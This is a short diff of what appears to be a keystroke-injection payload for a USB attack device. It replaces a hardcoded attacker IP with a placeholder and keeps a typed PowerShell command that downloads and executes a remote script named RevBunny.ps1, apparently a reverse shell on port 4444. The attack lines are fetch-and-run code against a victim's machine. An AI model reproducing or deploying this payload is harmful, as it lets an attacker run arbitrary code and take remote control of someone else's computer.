@@ -35,8 +35,8 @@ Q ENTER
 
 Q DELAY 500
 
-#Insert attacking IP
-Q STRING "\$I='192.168.178.25';\$P=4444;"
+#Insert attacking IP & Port below
+Q STRING "\$I='0.0.0.0';\$P=4444;"
 Q DELAY 250
 Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/RevBunny.ps1\")"
 Q DELAY 400
